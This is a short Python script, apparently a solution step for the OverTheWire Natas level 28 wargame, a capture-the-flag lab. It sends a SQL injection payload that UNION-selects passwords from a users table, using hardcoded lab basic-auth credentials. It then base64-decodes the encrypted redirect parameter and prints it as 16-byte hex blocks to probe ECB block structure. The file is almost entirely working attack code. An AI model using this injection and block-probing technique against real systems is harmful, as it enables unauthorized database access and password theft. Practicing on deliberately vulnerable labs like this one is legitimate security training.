import urllib.parse
import requests
from requests.auth import HTTPBasicAuth
import base64

URL = "http://natas28.natas.labs.overthewire.org"
auth_header = HTTPBasicAuth('natas28', '1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj')
initial_request_url = f"{URL}/index.php"

initial_query = "aaaaaaaaa' UNION SELECT password FROM users;#"

initial_request_body = { 'query' : initial_query }
r = requests.post(initial_request_url, auth=auth_header, data=initial_request_body, allow_redirects=False)
location_redirect_param = urllib.parse.unquote(r.headers['Location']).split("?query=")[1]
decoded_hex = base64.b64decode(location_redirect_param).hex()
(chunks, chunk_size) = (len(decoded_hex), 32)
for i in range(0, chunks, chunk_size):
    print(f"{i//32}: {decoded_hex[i: i+chunk_size]}")
print("------------------------------------------")
